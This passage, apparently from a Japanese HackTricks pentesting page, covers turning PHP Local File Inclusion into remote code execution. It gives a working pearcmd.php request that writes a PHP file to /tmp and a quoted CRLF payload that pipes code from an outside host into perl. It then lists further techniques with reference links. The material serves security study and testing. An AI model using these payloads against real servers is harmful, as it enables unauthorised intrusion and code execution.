As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), スクリプト `/usr/local/lib/phppearcmd.php` は php docker イメージにデフォルトで存在します。さらに、URL パラメータに `=` が無い場合は引数として扱われると記載されているため、URL 経由でスクリプトに引数を渡すことが可能です。詳細は [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) と [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/) を参照してください。

次のリクエストは、内容 `<?=phpinfo()?>` を持つファイルを `/tmp/hello.php` に作成します:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
以下は CRLF 脆弱性を悪用して RCE を取得する例です（[**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)より）：
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() 経由 (file_uploads = on)

もし **Local File Inclusion** を発見し、file_uploads = on の **phpinfo()** を公開しているファイルがあれば、RCE を取得できます：

{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure 経由

もし **Local File Inclusion** を発見し、テンポラリファイルのパスを **can exfiltrate the path** できるが、**server** が **checking** して **file to be included has PHP marks** かどうか確認している場合は、この **Race Condition** でその **bypass that check** を試せます：

{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce 経由

もし LFI を悪用して **upload temporary files** し、サーバーに PHP 実行を **hang** させることができれば、数時間にわたって **brute force filenames during hours** してテンポラリファイルを見つけることができます：

{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error へ

もし `/usr/bin/phar`、`/usr/bin/phar7`、`/usr/bin/phar.phar7`、`/usr/bin/phar.phar` のいずれかを include すると（そのエラーを投げるには同じファイルを2回 include する必要があります）。

**どのように役立つかは分かりませんが、役に立つかもしれません。**\
_たとえ PHP Fatal Error を引き起こしても、アップロードされた PHP の一時ファイルは削除されます._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## 参考

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
